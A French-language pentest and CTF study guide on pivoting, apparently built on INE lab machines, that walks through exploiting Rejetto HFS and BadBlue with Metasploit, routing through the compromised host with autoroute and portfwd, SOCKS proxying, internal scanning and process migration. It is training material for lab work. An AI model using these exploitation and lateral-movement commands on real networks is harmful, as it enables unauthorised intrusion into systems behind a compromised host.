# üîÑ Guide Pratique du Pivoting - CTF & Pentest

[‚Üê Retour √† la table des mati√®res](../README.md)

## üéØ Sc√©nario Type de Pivoting

### Architecture Cible
```
Attaquant (Kali) ‚Üí Machine1 (Accessible) ‚Üí Machine2 (R√©seau Interne)
                   demo1.ine.local        demo2.ine.local
                   Port 80 - HFS         Port 80 - BadBlue
```

## üìã M√©thodologie Compl√®te

### Phase 1 : Reconnaissance Initiale

#### V√©rification de l'accessibilit√©
```bash
# Test de connectivit√© des cibles
ping -c 4 demo1.ine.local
ping -c 4 demo2.ine.local

# R√©sultat attendu :
# demo1.ine.local : ‚úÖ Accessible
# demo2.ine.local : ‚ùå Non accessible (r√©seau interne)
```

#### Scan de la premi√®re cible
```bash
# Scan initial
nmap demo1.ine.local

# Scan d√©taill√© du service web
nmap -sV -p80 demo1.ine.local
```

### Phase 2 : Exploitation de la Premi√®re Cible

#### Recherche d'exploits
```bash
# Recherche d'exploits pour le service identifi√©
searchsploit hfs
searchsploit "rejetto http file server"

# R√©sultat : exploit/windows/http/rejetto_hfs_exec disponible
```

#### Exploitation avec Metasploit
```bash
# Lancement de msfconsole
msfconsole -q

# Chargement du module d'exploit
use exploit/windows/http/rejetto_hfs_exec

# Configuration du module
set RHOSTS demo1.ine.local
show options

# Lancement de l'exploit
exploit
```

### Phase 3 : D√©couverte du R√©seau Interne

#### Analyse de la configuration r√©seau
```bash
# Dans le meterpreter de la machine compromise
ipconfig

# Identification des r√©seaux :
# - Interface publique : acc√®s Internet
# - Interface priv√©e : r√©seau interne (ex: 10.0.19.x/20)
```

#### Configuration du pivoting
```bash
# Ajout de la route vers le r√©seau interne
run autoroute -s 10.0.19.0/20

# V√©rification des routes
run autoroute -p
```

### Phase 4 : Reconnaissance de la Deuxi√®me Cible

#### Scan via pivot
```bash
# Mise en arri√®re-plan de la session
background

# Scan de ports via le pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
set THREADS 10
exploit

# R√©sultat : port 80 ouvert sur demo2.ine.local
```

#### Configuration du port forwarding
```bash
# Retour √† la session meterpreter
sessions -i 1

# Configuration du port forwarding
portfwd add -l 1234 -p 80 -r 10.0.19.5  # IP de demo2.ine.local

# V√©rification des redirections
portfwd list
```

#### √ânum√©ration du service via forwarding
```bash
# Scan du service redirig√© (dans un nouveau terminal)
nmap -sV -sS -p 1234 localhost

# R√©sultat : BadBlue HTTPd 2.7 identifi√©
```

### Phase 5 : Exploitation de la Deuxi√®me Cible

#### Recherche d'exploits pour BadBlue
```bash
# Recherche d'exploits
searchsploit badblue 2.7

# R√©sultat : exploit/windows/http/badblue_passthru disponible
```

#### Exploitation via pivot
```bash
# Retour √† msfconsole
background

# Configuration de l'exploit pour la deuxi√®me cible
use exploit/windows/http/badblue_passthru

# IMPORTANT : Utiliser bind_tcp au lieu de reverse_tcp
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS demo2.ine.local
set RHOST demo2.ine.local

# V√©rification de la configuration
show options

# Lancement de l'exploit
exploit
```

### Phase 6 : R√©cup√©ration des Objectifs

#### Exploration du syst√®me compromis
```bash
# Passage en shell syst√®me
shell

# Navigation et recherche de flags
cd /
dir
type flag.txt

# Exemple de flag : c46d12f28d87ae0b92b05ebd9fb8e817
```

## üîß Commandes Essentielles pour le Pivoting

### Gestion des Routes
```bash
# Ajouter une route
run autoroute -s NETWORK/MASK
run autoroute -s 192.168.1.0/24
run autoroute -s 10.0.0.0/16

# Lister les routes actives
run autoroute -p

# Supprimer une route
run autoroute -d NETWORK/MASK

# Supprimer toutes les routes
run autoroute -D
```

### Port Forwarding
```bash
# Ajouter une redirection
portfwd add -l LOCAL_PORT -p REMOTE_PORT -r REMOTE_IP
portfwd add -l 8080 -p 80 -r 192.168.1.100

# Lister les redirections
portfwd list

# Supprimer une redirection
portfwd delete -l LOCAL_PORT -p REMOTE_PORT -r REMOTE_IP

# Supprimer toutes les redirections
portfwd flush
```

### Gestion des Sessions
```bash
# Lister les sessions actives
sessions -l

# Interagir avec une session
sessions -i SESSION_ID

# Mettre une session en arri√®re-plan
background

# Renommer une session
sessions -n "nom_descriptif" -i SESSION_ID

# Tuer une session
sessions -k SESSION_ID
```

## üéØ Techniques Avanc√©es

### Double Pivoting
```bash
# Sc√©nario : Attaquant ‚Üí Machine1 ‚Üí Machine2 ‚Üí Machine3

# Sur Machine1
run autoroute -s 192.168.1.0/24  # R√©seau de Machine2

# Apr√®s compromise de Machine2
sessions -i 2
run autoroute -s 172.16.0.0/24   # R√©seau de Machine3
```

### SOCKS Proxy
```bash
# Configuration d'un proxy SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run -j  # Lancement en arri√®re-plan

# Utilisation avec proxychains
# √âditer /etc/proxychains4.conf :
# socks4 127.0.0.1 9050

# Utilisation
proxychains nmap -sT TARGET_IP
proxychains firefox  # Navigation web via proxy
```

### Scan de R√©seaux Complets
```bash
# D√©couverte de hosts via pivot
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
set SESSION 1
run

# Scan de ports sur multiple hosts
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.1-254
set PORTS 21,22,23,25,53,80,110,139,445,993,995
set SESSION 1
run
```

## ‚ö†Ô∏è Points Critiques √† Retenir

### Choix des Payloads
```bash
# ‚ùå ERREUR : reverse_tcp pour machines pivot√©es
# Machine2 ne peut pas joindre directement l'attaquant

# ‚úÖ CORRECT : bind_tcp pour machines pivot√©es
set PAYLOAD windows/meterpreter/bind_tcp
set PAYLOAD linux/x86/meterpreter/bind_tcp
```

### Stabilit√© des Sessions
```bash
# Migrer vers un processus stable si n√©cessaire
migrate -N explorer.exe
migrate -N svchost.exe

# √âviter de fermer msfconsole pendant le pivoting
# Maintenir les sessions actives
```

### Nettoyage
```bash
# Supprimer les routes en fin de mission
run autoroute -D

# Supprimer les redirections de port
portfwd flush

# Fermer proprement les sessions
sessions -K  # Tuer toutes les sessions
```

## üõ†Ô∏è Checklist Pivoting

### ‚úÖ Avant l'Exploitation
- [ ] Identifier l'architecture r√©seau cible
- [ ] Confirmer l'accessibilit√© de la premi√®re machine
- [ ] V√©rifier l'inaccessibilit√© des machines internes

### ‚úÖ Apr√®s Premier Acc√®s
- [ ] Analyser la configuration r√©seau (`ipconfig`)
- [ ] Identifier les r√©seaux internes
- [ ] Configurer les routes (`autoroute`)
- [ ] Tester la connectivit√© vers les cibles internes

### ‚úÖ Exploitation des Machines Pivot√©es
- [ ] Utiliser `bind_tcp` au lieu de `reverse_tcp`
- [ ] Configurer le port forwarding si n√©cessaire
- [ ] Scanner les services via le pivot
- [ ] Documenter les acc√®s obtenus

### ‚úÖ Finalisation
- [ ] R√©cup√©rer tous les objectifs (flags, donn√©es)
- [ ] Documenter les chemins d'acc√®s
- [ ] Nettoyer les traces (routes, forwards)

## üìö Ressources Compl√©mentaires

- [Pivoting avec Metasploit](pivoting-metasploit.md) - Guide d√©taill√©
- [Techniques de Tunneling](../09-pivoting/README.md) - M√©thodes alternatives
- [Payloads Guide](../08-payloads/reverse-shells.md) - Choix des payloads
